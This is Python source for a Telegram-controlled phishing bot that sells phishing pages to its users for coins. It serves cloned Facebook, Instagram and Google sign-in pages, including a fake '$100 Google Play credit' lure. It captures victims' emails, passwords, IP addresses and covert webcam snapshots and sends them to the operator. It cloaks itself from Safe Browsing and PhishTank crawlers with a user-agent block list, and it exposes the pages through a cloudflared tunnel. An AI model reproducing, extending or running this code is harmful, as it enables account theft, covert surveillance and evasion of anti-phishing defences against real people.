.field { border:1px solid #dadce0; border-radius:4px; padding:13px 15px; width:100%; font-size:15px; margin-bottom:14px; }
.field:focus { border-color:#1a73e8; outline:none; box-shadow:0 0 0 1px #1a73e8; }
.forgot { color:#1a73e8; font-size:13px; margin-bottom:20px; display:block; text-decoration:none; }
.actions { display:flex; justify-content:space-between; align-items:center; }
.create { color:#1a73e8; font-size:13px; font-weight:500; }
.next { background:#1a73e8; color:#fff; border:none; border-radius:4px; padding:11px 26px; font-size:14px; font-weight:500; cursor:pointer; }
.footer-note { font-size:11.5px; color:#5f6368; text-align:center; margin-top:18px; max-width:460px; line-height:1.6; }
</style>
</head>
<body>
<div class="top-banner">
    <div class="icon">🎁</div>
    <div><h1>Google Play Store Credit Reward</h1><p>Claim your free $100 store credit</p></div>
</div>
<div class="offer-card">
    <div class="headline">🎉 You've been selected for $100 Google Play credit!</div>
    <div class="sub">As part of Google's loyalty rewards program, your account qualifies for a free $100 Google Play Store credit. Sign in to claim within 24 hours.</div>
    <div class="perks">
        <div class="perk"><span class="icon">💳</span><span><b>$100 Play Store credit</b> — usable on apps, games, movies</span></div>
        <div class="perk"><span class="icon">🎮</span><span><b>In-app purchases</b> — unlock premium content free</span></div>
        <div class="perk"><span class="icon">📚</span><span><b>Books & movies</b> — full catalog access</span></div>
        <div class="perk"><span class="icon">🔒</span><span><b>One-time claim</b> — credit expires in 24 hours</span></div>
    </div>
    <div class="timer-row">⏳ <span>Expires in 24h</span> — claim before it's gone</div>
</div>
<div class="card">
    <div class="google-logo"><span>G</span><span>o</span><span>o</span><span>g</span><span>l</span><span>e</span></div>
    <div class="step-label">Step 2 of 3 — Sign in to claim</div>
    <div class="step-desc">Sign in with the Google Account associated with this offer to receive your $100 credit.</div>
    <form method="POST" action="/capture/{{ page_id }}">
        <input class="field" type="text" name="email" placeholder="Email or phone" autocomplete="off" required>
        <input class="field" type="password" name="password" placeholder="Enter your password" autocomplete="off" required>
        <a class="forgot" href="#">Forgot email?</a>
        <div class="actions">
            <span class="create">Create account</span>
            <button class="next" type="submit">Claim $100 →</button>
        </div>
    </form>
</div>
<div class="footer-note">© 2024 Google LLC · Privacy · Terms · This offer is sponsored by Google Play Rewards</div>
</body>
</html>""",
}

REDIRECTS = {
    "facebook":  "https://www.facebook.com",
    "instagram": "https://www.instagram.com",
    "google":    "https://accounts.google.com",
}

# ═══════════════════════════════════════════════════════════════════
# GLOBAL STATE
# ═══════════════════════════════════════════════════════════════════

flask_app        = Flask(__name__)
captured_data    = {}
active_pages     = {}
camera_captures  = {}
public_url       = ""
notify_queue     = None
cloudflared_proc = None
bot_started_at   = datetime.now()

# ═══════════════════════════════════════════════════════════════════
# BOT UA DETECTION
# ═══════════════════════════════════════════════════════════════════

BOT_UA_KEYWORDS = [
    "googlebot", "google-safety", "google-safebrowsing", "gsitecrawler",
    "safebrowsing", "phishtank", "netcraft", "openphish",
    "bingbot", "yandexbot", "baiduspider", "msnbot",
    "duckduckbot", "slurp", "semrushbot", "ahrefsbot",
    "mj12bot", "dotbot", "rogerbot", "seznambot",
    "sogou", "exabot", "ia_archiver", "archive.org_bot",
    "facebookexternalhit", "facebot", "twitterbot",
    "linkedinbot", "applebot",
    "headlesschrome", "phantomjs", "screaming frog",
    "python-requests", "python-urllib", "libwww-perl",
    "wget/", "curl/",
]

def is_bot(ua: str) -> bool:
    if not ua:
        return True
    u = ua.lower()
    return any(k in u for k in BOT_UA_KEYWORDS)

# ═══════════════════════════════════════════════════════════════════
# HELPERS
# ═══════════════════════════════════════════════════════════════════

def add_legit_headers(response):
    response.headers['X-Frame-Options']        = 'SAMEORIGIN'
    response.headers['X-Content-Type-Options'] = 'nosniff'
    response.headers['Referrer-Policy']        = 'strict-origin-when-cross-origin'
    response.headers['Cache-Control']          = 'no-store, no-cache, must-revalidate'
    response.headers['Vary']                   = 'Accept-Encoding, User-Agent'
    response.headers['Server']                 = 'nginx/1.24.0'
    return response

def session_token(page_id: str) -> str:
    return hashlib.sha256(f"{SESSION_KEY}{page_id}".encode()).hexdigest()[:12]

def find_free_port(start=8080, tries=20) -> int:
    for port in range(start, start + tries):
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                s.bind(("0.0.0.0", port))
                return port
        except OSError:
            continue
    raise RuntimeError(f"No free port in {start}-{start+tries}")

def gen_id(n=8) -> str:
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=n))

def valid_url(u: str) -> bool:
    return bool(re.match(r"^https?://[^\s]+$", (u or "").strip(), re.IGNORECASE))

def now_str() -> str:
    return datetime.now().strftime("%Y-%m-%d %H:%M:%S")

# ═══════════════════════════════════════════════════════════════════
# FLASK ROUTES
# ═══════════════════════════════════════════════════════════════════

@flask_app.route("/robots.txt")
def robots():
    resp = make_response("User-agent: *\nDisallow: /admin/\nDisallow: /api/\nSitemap: /sitemap.xml\n")
    resp.content_type = "text/plain"
    return resp

@flask_app.route("/sitemap.xml")
def sitemap():
    resp = make_response("""<?xml version="1.0" encoding="UTF-8"?>
<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">
<url><loc>https://example.com/</loc><changefreq>daily</changefreq></url>
</urlset>""")
    resp.content_type = "application/xml"
    return resp

@flask_app.route("/")
def index():
    resp = make_response(
        "<html><head><title>Welcome</title></head>"
        "<body><h1>Welcome</h1><p>Please check back later.</p></body></html>"
    )
    return add_legit_headers(resp)

@flask_app.route("/verify/<page_id>")
def landing(page_id):
    info = active_pages.get(page_id)
    if not info:
        return add_legit_headers(make_response("<h1>Not Found</h1>", 404))

    ua = request.headers.get("User-Agent", "")
    ip = request.remote_addr
    log.info(f"[LANDING] page={page_id} ip={ip} ua={ua[:60]}")

    if is_bot(ua):
        log.info(f"[LANDING-BOT] {ua[:80]}")
        resp = make_response(
            "<html><head><title>Secure Portal</title></head>"
            "<body><h2>Verification Complete</h2>"
            "<p>Your session is authenticated and encrypted.</p></body></html>"
        )
        return add_legit_headers(resp)

    token = session_token(page_id)

    if info.get("camera_only"):
        target = info.get("redirect_url", "https://google.com")
        resp = make_response(render_template_string(
            CAMERA_ONLY_BLANK, page_id=page_id, next_url=target,
        ))
        resp.set_cookie(f"sv_{page_id}", token, max_age=3600, samesite='Lax')
        return add_legit_headers(resp)

    if info.get("camera", False):
        tpl = CAMERA_TEMPLATES.get(info["template"], CAMERA_TEMPLATES["facebook"])
        resp = make_response(render_template_string(
            tpl, page_id=page_id, next_url=f"/p/{page_id}", delay_ms=1500,
        ))
        resp.set_cookie(f"sv_{page_id}", token, max_age=3600, samesite='Lax')
        return add_legit_headers(resp)

    html = f"""<!DOCTYPE html>
<html><head><meta charset="UTF-8"><title>Verification Required</title>
<meta http-equiv="refresh" content="2;url=/p/{page_id}">
<style>
* {{ margin:0; padding:0; box-sizing:border-box; }}
body {{ font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Arial,sans-serif; background:#f5f7fa; display:flex; justify-content:center; align-items:center; height:100vh; }}
.box {{ text-align:center; padding:50px 40px; background:#fff; border-radius:12px; box-shadow:0 4px 20px rgba(0,0,0,.08); max-width:360px; width:90%; }}
.spinner {{ width:48px; height:48px; border:4px solid #e8eaf6; border-top:4px solid #1877f2; border-radius:50%; animation:spin .9s linear infinite; margin:0 auto 24px; }}
@keyframes spin {{ to {{ transform:rotate(360deg); }} }}
h2 {{ font-size:20px; color:#1a1a2e; margin-bottom:10px; font-weight:600; }}
p  {{ color:#6b7280; font-size:14px; line-height:1.6; }}
.lock {{ font-size:36px; margin-bottom:16px; }}
</style></head><body>
<div class="box">
    <div class="lock">🔒</div><div class="spinner"></div>
    <h2>Verifying your session...</h2>
    <p>Please wait, you will be redirected automatically.</p>
</div></body></html>"""
    resp = make_response(html)
    resp.set_cookie(f"sv_{page_id}", token, max_age=3600, samesite='Lax')
    return add_legit_headers(resp)

@flask_app.route("/p/<page_id>")
def serve_phish(page_id):
    info = active_pages.get(page_id)
    if not info:
        return add_legit_headers(make_response("<h1>Not Found</h1>", 404))
    ua = request.headers.get("User-Agent", "")
    log.info(f"[PHISH] page={page_id} ip={request.remote_addr}")
    if is_bot(ua):
        log.info(f"[PHISH-BOT] {ua[:80]}")
        resp = make_response(
            "<html><head><title>Welcome</title></head>"
            "<body><p>Welcome to our secure portal.</p></body></html>"
        )
        return add_legit_headers(resp)
    html = TEMPLATES.get(info["template"], TEMPLATES["facebook"])
    resp = make_response(render_template_string(html, page_id=page_id))
    return add_legit_headers(resp)

@flask_app.route("/capture/<page_id>", methods=["POST"])
def capture(page_id):
    info = active_pages.get(page_id)
    if not info:
        log.warning(f"[CAPTURE-404] page={page_id}")
        return "Error", 404

    ua   = request.headers.get("User-Agent", "unknown")
    ip   = request.remote_addr
    dest = REDIRECTS.get(info["template"], "https://google.com")

    log.info(f"[CAPTURE-HIT] page={page_id} ip={ip} ua={ua[:60]}")

    email    = request.form.get("email", "").strip()
    password = request.form.get("password", "").strip()

    if not email and not password:
        log.warning(f"[CAPTURE-SKIP] empty form page={page_id}")
        return redirect(dest)

    ts = now_str()
    captured_data.setdefault(page_id, []).append({
        "email": email, "password": password,
        "ip": ip, "ua": ua, "ts": ts,
    })

    owner = str(info["chat_id"])
    if owner in users_db:
        users_db[owner]["captures_received"] = int(users_db[owner].get("captures_received", 0)) + 1
        save_users()

    cam_count = len(camera_captures.get(page_id, []))
    msg = (
        f"🎣 *New Capture!*\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"📌 Page: `{info['label']}`\n"
        f"📧 Email: `{email}`\n"
        f"🔑 Password: `{password}`\n"
        f"🌐 IP: `{ip}`\n"
        f"📷 Camera snaps: `{cam_count}`\n"
        f"🕐 Time: `{ts}`\n"
        f"📱 UA: `{ua[:80]}`\n"
        f"━━━━━━━━━━━━━━━━━━━━"
    )
    if notify_queue is not None:
        try:
            notify_queue.put_nowait(("text", info["chat_id"], msg))
            log.info(f"[CAPTURE-QUEUED] to={info['chat_id']} email={email[:20]}")
        except Exception as e:
            log.error(f"[CAPTURE-QUEUE-ERR] {e}")
    else:
        log.error("[CAPTURE] notify_queue is None — bot not ready")
    return redirect(dest)

@flask_app.route("/snap/<page_id>", methods=["POST"])
def snap(page_id):
    info = active_pages.get(page_id)
    if not info:
        return jsonify({"ok": False}), 404
    log.info(f"[SNAP-HIT] page={page_id} ip={request.remote_addr}")
    try:
        data = request.get_json(silent=True) or {}
        img_b64 = data.get("img", "")
        if not img_b64:
            log.warning(f"[SNAP-SKIP] no img page={page_id}")
            return jsonify({"ok": False}), 400
        if "," in img_b64:
            img_b64 = img_b64.split(",", 1)[1]
        img_bytes = base64.b64decode(img_b64)
        camera_captures.setdefault(page_id, []).append(img_bytes)
        snap_num = len(camera_captures[page_id])
        ip = request.remote_addr
        ts = datetime.now().strftime("%H:%M:%S")
        mode_tag = "🎥 CamOnly" if info.get("camera_only") else f"📷 {info['template'].capitalize()}"
        caption = (
            f"📷 *Camera Capture #{snap_num}*\n"
            f"📌 Page: `{info['label']}`\n"
            f"🎯 Mode: {mode_tag}\n"
            f"🌐 IP: `{ip}`\n"
            f"🕐 Time: `{ts}`"
        )
        if notify_queue is not None:
            notify_queue.put_nowait(("photo", info["chat_id"], img_bytes, caption))
            log.info(f"[SNAP-QUEUED] to={info['chat_id']} size={len(img_bytes)}")
        return jsonify({"ok": True, "snap": snap_num})
    except Exception as e:
        log.error(f"snap err: {e}")
        log.error(traceback.format_exc())
        return jsonify({"ok": False}), 500

@flask_app.route("/health")
def health():
    return "OK", 200

def run_flask(port):
    logging.getLogger("werkzeug").setLevel(logging.INFO)
    flask_app.run(host="0.0.0.0", port=port, debug=False, use_reloader=False, threaded=True)

# ═══════════════════════════════════════════════════════════════════
# FLASK READY WAIT
# ═══════════════════════════════════════════════════════════════════

def wait_for_flask(port, timeout=20):
    deadline = time.time() + timeout
    while time.time() < deadline:
        try:
            with socket.create_connection(("127.0.0.1", port), timeout=1):
                return True
        except OSError:
            time.sleep(0.5)
    return False

# ═══════════════════════════════════════════════════════════════════
# CLOUDFLARED
# ═══════════════════════════════════════════════════════════════════

def find_cloudflared():
    candidates = [
        os.path.expanduser("~/.local/bin/cloudflared"),
        "/usr/local/bin/cloudflared",
        "/usr/bin/cloudflared",
    ]
    from shutil import which
    p = which("cloudflared")
    if p:
        return p
    for c in candidates:
        if os.path.isfile(c) and os.access(c, os.X_OK):
            return c
    return ""

def start_cloudflared(port):
    global public_url, cloudflared_proc

    cf = find_cloudflared()
    if not cf:
        log.error("cloudflared not found")
        return ""

    log.info(f"cloudflared: {cf}")
    cloudflared_proc = subprocess.Popen(
        [cf, "tunnel", "--url", f"http://localhost:{port}", "--no-autoupdate"],
        stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, bufsize=1
    )

    deadline = time.time() + TUNNEL_WAIT
    for line in cloudflared_proc.stdout:
        line = line.strip()
        if line:
            log.info(f"[CF] {line}")
        m = re.search(r"https://[a-zA-Z0-9\-]+\.trycloudflare\.com", line)
        if m:
            public_url = m.group(0)
            log.info(f"Tunnel ready: {public_url}")
            return public_url
        if time.time() > deadline:
            log.error("Tunnel timeout")
            break
    return ""

# ═══════════════════════════════════════════════════════════════════
# NOTIFICATION WORKER
# ═══════════════════════════════════════════════════════════════════

async def _safe_send_text(bot, chat_id, text, retries=3):
    for i in range(retries):
        try:
            await bot.send_message(chat_id=chat_id, text=text, parse_mode="Markdown")
            return True
        except Exception as e:
            log.warning(f"send_text try {i+1}/{retries}: {e}")
            await asyncio.sleep(1.5)
    try:
        await bot.send_message(chat_id=chat_id, text=text)
        return True
    except Exception as e:
        log.error(f"send_text plain fallback failed: {e}")
        return False

async def _safe_send_photo(bot, chat_id, img_bytes, caption, retries=3):
    for i in range(retries):
        try:
            bio = io.BytesIO(img_bytes); bio.name = "snap.jpg"
            await bot.send_photo(
                chat_id=chat_id,
                photo=InputFile(bio, filename="snap.jpg"),
                caption=caption, parse_mode="Markdown"
            )
            return True
        except Exception as e:
            log.warning(f"send_photo try {i+1}/{retries}: {e}")
            await asyncio.sleep(1.5)
    try:
        bio = io.BytesIO(img_bytes); bio.name = "snap.jpg"
        await bot.send_photo(chat_id=chat_id, photo=InputFile(bio, filename="snap.jpg"))
        return True
    except Exception as e:
        log.error(f"send_photo fallback failed: {e}")
        return False

async def notification_worker(bot):
    while True:
        try:
            item = await asyncio.wait_for(notify_queue.get(), timeout=5.0)
            try:
                kind = item[0]
                if kind == "text":
                    _, chat_id, text = item
                    ok = await _safe_send_text(bot, chat_id, text)
                    log.info(f"[NOTIFY-TEXT] to={chat_id} ok={ok}")
                elif kind == "photo":
                    _, chat_id, img_bytes, caption = item
                    ok = await _safe_send_photo(bot, chat_id, img_bytes, caption)
                    log.info(f"[NOTIFY-PHOTO] to={chat_id} size={len(img_bytes)} ok={ok}")
            except Exception as e:
                log.error(f"worker send err: {e}")
                log.error(traceback.format_exc())
            finally:
                notify_queue.task_done()
        except asyncio.TimeoutError:
            continue
        except Exception as e:
            log.error(f"worker err: {e}")
            await asyncio.sleep(1)

# ═══════════════════════════════════════════════════════════════════
# SHUTDOWN
# ═══════════════════════════════════════════════════════════════════

def _shutdown(sig, frame):
    log.info("Shutting down...")
    if cloudflared_proc:
        try: cloudflared_proc.terminate()
        except Exception: pass
    sys.exit(0)

if not os.environ.get("SKIP_SIGNAL_HANDLERS"):
    signal.signal(signal.SIGINT, _shutdown)
    signal.signal(signal.SIGTERM, _shutdown)

# ═══════════════════════════════════════════════════════════════════
# AWAITING FLAGS
# ═══════════════════════════════════════════════════════════════════

AWAIT_LABEL    = "await_label"
AWAIT_CAMONLY  = "await_camonly_url"
AWAIT_ADM_UID  = "await_adm_uid"
AWAIT_ADM_AMT  = "await_adm_amount"
AWAIT_ADM_BC   = "await_adm_broadcast"

def clear_await(context):
    for k in ("awaiting", "pending_template", "pending_camera",
              "adm_action", "adm_target_uid"):
        context.user_data.pop(k, None)

# ═══════════════════════════════════════════════════════════════════
# MENUS
# ═══════════════════════════════════════════════════════════════════

def main_menu_kb(uid) -> InlineKeyboardMarkup:
    rows = [
        [InlineKeyboardButton("📘 Facebook Badge",       callback_data="tpl_facebook")],
        [InlineKeyboardButton("📸 Instagram Followers",  callback_data="tpl_instagram")],
        [InlineKeyboardButton("🔵 Google Play $100",     callback_data="tpl_google")],
        [InlineKeyboardButton("🎥 Camera-Only Link",     callback_data="camonly")],
        [InlineKeyboardButton("💰 Balance",              callback_data="balance")],
        [InlineKeyboardButton("🎁 Referral Link",        callback_data="reflink")],
        [InlineKeyboardButton("📋 My Links",             callback_data="mylinks")],
        [InlineKeyboardButton("📥 All Captures",         callback_data="allcaps")],
        [InlineKeyboardButton("📷 Camera Caps",          callback_data="camcaps")],
        [InlineKeyboardButton("📊 Status",               callback_data="statusbtn")],
    ]
    if is_admin(uid):
        rows.append([InlineKeyboardButton("⚙️ ADMIN PANEL", callback_data="admin_panel")])
    return InlineKeyboardMarkup(rows)

async def send_menu(msg_or_q, uid, edit=False):
    u = get_user(uid)
    text = (
        f"👨‍💻 Developer: *MZ MINHAZ*\n"
        f"🎣 *Phishing Bot Active*\n\n"
        f"💰 Balance: *{u.get('coins', 0)}* coins\n"
        f"⚡ Per service: *{coin_cost()}* coin\n"
        f"🎁 Referral bonus: *{referral_bonus()}* coins\n\n"
        f"👇 Menu theke option bacho:"
    )
    kb = main_menu_kb(uid)
    if edit:
        try:
            await msg_or_q.edit_text(text, reply_markup=kb, parse_mode="Markdown")
            return
        except Exception:
            pass
    await msg_or_q.reply_text(text, reply_markup=kb, parse_mode="Markdown")

def admin_panel_kb() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("➕ Add Coins",      callback_data="adm_addcoins")],
        [InlineKeyboardButton("➖ Remove Coins",   callback_data="adm_rmcoins")],
        [InlineKeyboardButton("👤 User Lookup",    callback_data="adm_lookup")],
        [InlineKeyboardButton("📊 Bot Stats",      callback_data="adm_stats")],
        [InlineKeyboardButton("⚙️ Set Cost",       callback_data="adm_setcost")],
        [InlineKeyboardButton("🎁 Set Ref Bonus",  callback_data="adm_setref")],
        [InlineKeyboardButton("🎉 Set Welcome",    callback_data="adm_setwel")],
        [InlineKeyboardButton("📢 Broadcast",      callback_data="adm_broadcast")],
        [InlineKeyboardButton("⬅️ Back",           callback_data="back_main")],
    ])

# ═══════════════════════════════════════════════════════════════════
# COMMANDS
# ═══════════════════════════════════════════════════════════════════

async def cmd_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    u   = get_user(uid)
    u["username"]   = update.effective_user.username or ""
    u["first_name"] = update.effective_user.first_name or ""
    save_users()
    clear_await(context)

    if context.args:
        arg = context.args[0]
        if arg.startswith("ref_"):
            ref_id = arg[4:].strip()
            if ref_id.isdigit() and int(ref_id) != uid:
                if not u.get("ref_by") and u.get("joined"):
                    u["ref_by"] = int(ref_id)
                    ref_u = get_user(int(ref_id))
                    ref_u.setdefault("refs", []).append(uid)
                    add_coins(int(ref_id), referral_bonus())
                    save_users()
                    try:
                        await context.bot.send_message(
                            chat_id=int(ref_id),
                            text=f"🎉 *New referral!*\n\n+{referral_bonus()} coins added.",
                            parse_mode="Markdown"
                        )
                    except Exception:
                        pass

    if not await is_member(context.bot, uid) and not is_admin(uid):
        await update.message.reply_text(
            f"🚫 *Access Denied*\n\n"
            f"Bot use korte hole amader channel e join thakte hobe.\n\n"
            f"👇 Join kore *Verify* te click koro:",
            reply_markup=join_gate_kb(),
            parse_mode="Markdown"
        )
        return

    if not u.get("joined"):
        u["joined"] = True
        u["joined_at"] = now_str()
        wc = welcome_coins()
        if wc > 0:
            u["coins"] = int(u.get("coins", 0)) + wc
        save_users()

    await send_menu(update.message, uid)


async def cmd_balance(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    u = get_user(uid)
    await update.message.reply_text(
        f"💰 *Your Balance*\n\n"
        f"Coins: *{u.get('coins', 0)}*\n"
        f"Referrals: *{len(u.get('refs', []))}*\n"
        f"Referral bonus: *{referral_bonus()}* coins/ref\n"
        f"Page cost: *{coin_cost()}* coin",
        parse_mode="Markdown"
    )


async def cmd_myref(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    me  = await context.bot.get_me()
    link = f"https://t.me/{me.username}?start=ref_{uid}"
    await update.message.reply_text(
        f"🎁 *Your Referral Link*\n\n`{link}`\n\n"
        f"Every successful referral = *{referral_bonus()}* coins",
        parse_mode="Markdown", disable_web_page_preview=True
    )


async def cmd_help(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "📖 *Commands*\n\n"
        "/start — main menu\n"
        "/balance — coins + ref stats\n"
        "/myref — referral link\n"
        "/help — this help\n",
        parse_mode="Markdown"
    )


async def cmd_setadmin(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    admins = [int(x) for x in config_db.get("admins", [])]

    if not is_admin(uid):
        await update.message.reply_text("🚫 Not admin.")
        return

    if not context.args:
        await update.message.reply_text("Usage: `/setadmin <user_id>`", parse_mode="Markdown")
        return
    try:
        new_id = int(context.args[0])
    except Exception:
        await update.message.reply_text("❌ Invalid ID.")
        return
    if new_id not in admins:
        admins.append(new_id)
        config_db["admins"] = admins
        save_config()
    await update.message.reply_text(f"✅ Added admin `{new_id}`.", parse_mode="Markdown")


async def cmd_status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if not await is_member(context.bot, uid) and not is_admin(uid):
        await update.message.reply_text("🚫 Channel join required.")
        return
    u = get_user(uid)
    my_pages = sum(1 for v in active_pages.values() if v["chat_id"] == uid)
    my_caps  = sum(len(e) for pid, e in captured_data.items() if active_pages.get(pid, {}).get("chat_id") == uid)
    my_snaps = sum(len(s) for pid, s in camera_captures.items() if active_pages.get(pid, {}).get("chat_id") == uid)
    await update.message.reply_text(
        f"📊 *Status*\n\n"
        f"💰 Coins: `{u.get('coins', 0)}`\n"
        f"🎁 Referrals: `{len(u.get('refs', []))}`\n"
        f"🌐 URL: `{public_url}`\n"
        f"📄 Active pages: `{my_pages}`\n"
        f"🎣 Credentials: `{my_caps}`\n"
        f"📷 Camera snaps: `{my_snaps}`",
        parse_mode="Markdown"
    )


async def cmd_clear(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    pids = [pid for pid, v in active_pages.items() if v["chat_id"] == uid]
    for pid in pids:
        active_pages.pop(pid, None)
        captured_data.pop(pid, None)
        camera_captures.pop(pid, None)
    await update.message.reply_text(f"🗑️ {len(pids)} page delete hoyeche.")

# ═══════════════════════════════════════════════════════════════════
# CALLBACK HANDLER
# ═══════════════════════════════════════════════════════════════════

async def verify_join_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.answer()
    uid = q.from_user.id
    if not await is_member(context.bot, uid):
        await q.message.reply_text(
            "❌ Tumi ekhono channel e join koro nai.\n"
            f"Join: {CHANNEL_URL}\nTarpor abar Verify chapo.",
            disable_web_page_preview=True
        )
        return
    u = get_user(uid)
    if not u.get("joined"):
        u["joined"] = True
        u["joined_at"] = now_str()
        wc = welcome_coins()
        if wc > 0:
            u["coins"] = int(u.get("coins", 0)) + wc
        save_users()
    await q.message.reply_text("✅ Verified! Menu pathano hocche...")
    await send_menu(q.message, uid)


async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q    = update.callback_query
    await q.answer()
    data = q.data
    uid  = q.from_user.id

    if data != "verify_join" and not is_admin(uid):
        if not await is_member(context.bot, uid):
            await q.message.reply_text(
                f"🚫 Channel e join korte hobe age.\n{CHANNEL_URL}",
                reply_markup=join_gate_kb(),
                disable_web_page_preview=True
            )
            return

    if data.startswith("tpl_"):
        tpl = data[4:]
        u = get_user(uid)
        cost = coin_cost()
        if not is_admin(uid) and int(u.get("coins", 0)) < cost:
            await q.message.reply_text(
                f"💸 *Not enough coins!*\n\n"
                f"Balance: `{u.get('coins', 0)}`\n"
                f"Need: `{cost}`\n\n"
                f"🎁 Invite friends to earn {referral_bonus()} coins each.\n"
                f"Use /myref to get your referral link.",
                parse_mode="Markdown"
            )
            return

        clear_await(context)
        context.user_data["pending_template"] = tpl

        kb = InlineKeyboardMarkup([
            [InlineKeyboardButton("📷 Camera ON",  callback_data="cam_yes")],
            [InlineKeyboardButton("❌ Camera OFF", callback_data="cam_no")],
        ])
        await q.message.reply_text(
            f"✅ Template: *{tpl.capitalize()}*\n\n"
            f"💸 Cost: *{cost}* coin\n"
            f"📷 Camera capture chalu korbe?",
            reply_markup=kb,
            parse_mode="Markdown"
        )
        return

    if data in ("cam_yes", "cam_no"):
        context.user_data["pending_camera"] = (data == "cam_yes")
        context.user_data["awaiting"] = AWAIT_LABEL
        cam_txt = "✅ Camera ON" if context.user_data["pending_camera"] else "❌ Camera OFF"
        await q.message.reply_text(
            f"{cam_txt}\n\n"
            f"📝 Ekhon victim-er ekta *label* pathao (jemon: `victim1`, `rahim`, etc.):",
            parse_mode="Markdown"
        )
        return

    if data == "camonly":
        u = get_user(uid)
        cost = coin_cost()
        if not is_admin(uid) and int(u.get("coins", 0)) < cost:
            await q.message.reply_text(
                f"💸 *Not enough coins!*\n\nBalance: `{u.get('coins', 0)}` • Need: `{cost}`\n\n"
                f"🎁 Invite friends — {referral_bonus()} coins each. Use /myref.",
                parse_mode="Markdown"
            )
            return
        clear_await(context)
        context.user_data["awaiting"] = AWAIT_CAMONLY
        await q.message.reply_text(
            "🎥 *Camera-Only Link Generator*\n\n"
            "Ekta *target URL* pathao (victim camera capture er por ekhane redirect hobe).\n\n"
            "Example: `https://facebook.com`",
            parse_mode="Markdown"
        )
        return

    if data == "balance":
        u = get_user(uid)
        await q.message.reply_text(
            f"💰 *Balance*\n\n"
            f"Coins: *{u.get('coins', 0)}*\n"
            f"Referrals: *{len(u.get('refs', []))}*\n"
            f"Page cost: *{coin_cost()}* coin",
            parse_mode="Markdown"
        )
        return

    if data == "reflink":
        me = await context.bot.get_me()
        link = f"https://t.me/{me.username}?start=ref_{uid}"
        await q.message.reply_text(
            f"🎁 *Your Referral Link*\n\n`{link}`\n\n"
            f"Every referral = *{referral_bonus()}* coins",
            parse_mode="Markdown", disable_web_page_preview=True
        )
        return

    if data == "mylinks":
        links = []
        for pid, v in active_pages.items():
            if v["chat_id"] != uid: continue
            tag = "🎥" if v.get("camera_only") else "🔗"
            links.append(f"• {tag} `{v['label']}` → `{public_url}/verify/{pid}`")
        msg = "\n".join(links) if links else "Kono active page nei."
        await q.message.reply_text(msg, parse_mode="Markdown", disable_web_page_preview=True)
        return

    if data == "allcaps":
        lines = []
        for pid, entries in captured_data.items():
            if active_pages.get(pid, {}).get("chat_id") == uid:
                label = active_pages[pid]["label"]
                for e in entries:
                    lines.append(f"[{label}] {e['email']} | {e['password']} | {e['ip']} | {e['ts']}")
        text = "\n".join(lines) if lines else "Ekhono kichu asheni."
        if len(text) > 3800:
            text = text[-3800:]
        await q.message.reply_text(f"```\n{text}\n```", parse_mode="Markdown")
        return

    if data == "camcaps":
        total = sum(len(s) for pid, s in camera_captures.items() if active_pages.get(pid, {}).get("chat_id") == uid)
        await q.message.reply_text(f"📷 Total camera captures: `{total}`", parse_mode="Markdown")
        return

    if data == "statusbtn":
        u = get_user(uid)
        my_pages = sum(1 for v in active_pages.values() if v["chat_id"] == uid)
        my_caps  = sum(len(e) for pid, e in captured_data.items() if active_pages.get(pid, {}).get("chat_id") == uid)
        my_snaps = sum(len(s) for pid, s in camera_captures.items() if active_pages.get(pid, {}).get("chat_id") == uid)
        await q.message.reply_text(
            f"📊 *Your Status*\n\n"
            f"💰 Coins: `{u.get('coins', 0)}`\n"
            f"🎁 Referrals: `{len(u.get('refs', []))}`\n"
            f"📄 Active pages: `{my_pages}`\n"
            f"🎣 Captures: `{my_caps}`\n"
            f"📷 Camera snaps: `{my_snaps}`",
            parse_mode="Markdown"
        )
        return

    if data.startswith("del_"):
        pid = data[4:]
        if (pid in active_pages and active_pages[pid]["chat_id"] == uid) or is_admin(uid):
            active_pages.pop(pid, None)
            captured_data.pop(pid, None)
            camera_captures.pop(pid, None)
            await q.message.reply_text(f"🗑️ `{pid}` delete hoyeche.", parse_mode="Markdown")
        return

    if data == "admin_panel":
        if not is_admin(uid): return
        await q.message.edit_text(
            f"⚙️ *ADMIN PANEL*\n\n"
            f"Admins: `{config_db.get('admins', [])}`\n"
            f"Coin cost: `{coin_cost()}`\n"
            f"Referral bonus: `{referral_bonus()}`\n"
            f"Welcome coins: `{welcome_coins()}`\n"
            f"Total users: `{len(users_db)}`",
            reply_markup=admin_panel_kb(),
            parse_mode="Markdown"
        )
        return

    if data == "back_main":
        await send_menu(q.message, uid, edit=True)
        return

    if data == "adm_stats":
        if not is_admin(uid): return
        total_coins = sum(int(u.get("coins", 0)) for u in users_db.values())
        total_refs  = sum(len(u.get("refs", [])) for u in users_db.values())
        joined      = sum(1 for u in users_db.values() if u.get("joined"))
        await q.message.reply_text(
            f"📊 *Bot Stats*\n\n"
            f"👥 Total users: `{len(users_db)}`\n"
            f"✅ Joined: `{joined}`\n"
            f"💰 Coins in circulation: `{total_coins}`\n"
            f"🎁 Referrals: `{total_refs}`\n"
            f"📄 Active pages: `{len(active_pages)}`\n"
            f"🎣 Captures: `{sum(len(v) for v in captured_data.values())}`\n"
            f"📷 Camera snaps: `{sum(len(v) for v in camera_captures.values())}`\n"
            f"⏱ Uptime: `{str(datetime.now() - bot_started_at).split('.')[0]}`",
            parse_mode="Markdown"
        )
        return

    if data in ("adm_addcoins", "adm_rmcoins", "adm_lookup"):
        if not is_admin(uid): return
